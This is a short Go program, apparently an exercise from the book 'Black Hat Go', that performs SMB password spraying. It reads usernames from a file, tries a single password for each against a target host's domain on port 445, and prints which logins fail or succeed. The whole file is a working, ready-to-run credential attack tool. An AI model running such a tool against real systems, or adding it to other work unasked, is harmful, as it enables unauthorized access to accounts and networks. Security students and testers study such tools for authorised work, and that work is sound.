package main

import (
	"black_hat_go/smb_staff/smb/smb"
	"bytes"
	"fmt"
	"log"
	"os"
)

func main() {
	if len(os.Args) != 5 {
		log.Fatalln("Usage main </user/file> <password> <domain> <target_host>")
	}
	buf, err := os.ReadFile(os.Args[1])
	if err != nil {
		log.Fatal(err)
	}
	options := smb.Options{
		Password: os.Args[2],
		Domain:   os.Args[3],
		Host:     os.Args[4],
		Port:     445,
	}
	users := bytes.Split(buf, []byte{'\n'})
	for _, user := range users {
		options.User = string(user)
		session, err := smb.NewSession(options, false)
		if err != nil {
			fmt.Printf("[-] Login failed: %s\\%s [%s]\n", options.Domain, options.User, options.Password)
			continue
		}
		defer session.Close()
		if session.IsAuthenticated {
			fmt.Printf("[+] Succes: %s\\%s [%s]\n", options.Domain, options.User, options.Password)
		}
	}
}
